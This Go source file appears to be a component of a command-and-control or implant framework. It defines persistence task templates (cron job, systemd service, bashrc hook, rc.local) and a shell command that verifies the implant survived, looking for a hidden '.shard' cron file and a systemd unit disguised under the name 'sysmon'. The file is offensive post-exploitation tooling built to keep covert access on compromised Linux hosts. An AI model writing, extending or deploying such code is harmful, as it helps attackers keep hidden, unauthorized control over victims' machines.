package engine

import (
	"encoding/json"
	"fmt"
)

type persistConfig struct {
	Methods []string `json:"methods"`
}

var persistMethods = map[string]TaskTemplate{
	"cron": {
		Name:    "Persist: Cron Job",
		CmdType: "persist",
		Payload: "cron",
	},
	"systemd": {
		Name:    "Persist: Systemd Service",
		CmdType: "persist",
		Payload: "systemd",
	},
	"bashrc": {
		Name:    "Persist: Bashrc Hook",
		CmdType: "persist",
		Payload: "bashrc",
	},
	"rc.local": {
		Name:    "Persist: RC Local",
		CmdType: "persist",
		Payload: "rc.local",
	},
}

func PersistTasks(config string) []TaskTemplate {
	var cfg persistConfig
	json.Unmarshal([]byte(config), &cfg)

	if len(cfg.Methods) == 0 {
		cfg.Methods = []string{"cron", "systemd", "bashrc"}
	}

	var tasks []TaskTemplate
	for _, method := range cfg.Methods {
		if t, ok := persistMethods[method]; ok {
			tasks = append(tasks, t)
		}
	}

	tasks = append(tasks, TaskTemplate{
		Name:    "Verify Persistence",
		CmdType: "shell",
		Payload: fmt.Sprintf(`echo "=== CRON ===" && (crontab -l 2>/dev/null; ls /etc/cron.d/ 2>/dev/null; cat ~/.local/cron.d/.shard 2>/dev/null) && echo "=== SYSTEMD ===" && (systemctl list-unit-files 2>/dev/null | grep sysmon; ls ~/.config/systemd/user/ 2>/dev/null) && echo "=== BASHRC ===" && tail -5 ~/.bashrc 2>/dev/null && echo "=== RC.LOCAL ===" && cat /etc/rc.local 2>/dev/null | tail -5`),
	})

	return tasks
}
